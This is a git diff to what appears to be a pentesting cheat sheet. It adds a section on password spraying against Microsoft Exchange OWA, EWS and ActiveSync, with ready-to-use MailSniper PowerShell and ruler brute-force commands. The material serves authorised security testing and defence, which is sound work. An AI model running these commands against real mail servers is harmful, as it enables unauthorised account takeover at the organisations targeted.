@@ -51,7 +51,7 @@ it is the first version of this repo, many things will be added later, so stay t
     - [ExecutionPolicy](#executionpolicy)
     - [RunAsPPL for Credentials Dumping](#runasppl-for-credentials-dumping)
   - [MS Exchange](#ms-exchange)
-    - [OWA Password Spraying](#owa-password-spraying)
+    - [OWA, EWS and EAS Password Spraying](#owa-ews-and-eas-password-spraying)
     - [GAL and OAB Extraction](#gal-and-oab-extraction)
     - [PrivExchange](#privexchange)
     - [ProxyLogon](#proxylogon)
@@ -813,7 +813,21 @@ mimikatz # !-
 
 ## MS Exchange 
 
-### OWA Password Spraying
+### OWA EWS and EAS Password Spraying
+
+> using [MailSniper](https://github.com/dafthack/MailSniper/blob/master/MailSniper.ps1) :
+```powershell
+# OWA (Outlook web App)
+Invoke-PasswordSprayOWA -ExchHostname $domain -UserList .\users.txt -Password $password
+# EAS (Exchange ActivSync)
+Invoke-PasswordSprayEAS -ExchHostname $domain -UserList .\users.txt -Password $password
+# EWS (Exchange Web Service)
+Invoke-PasswordSprayEWS -ExchHostname $domain -UserList .\users.txt -Password $password
+```
+> using [ruler](https://github.com/sensepost/ruler) :
+```bash
+./ruler -domain $domain --insecure brute --userpass $userpass.txt -v
+```
 
 ### GAL and OAB Extraction
 
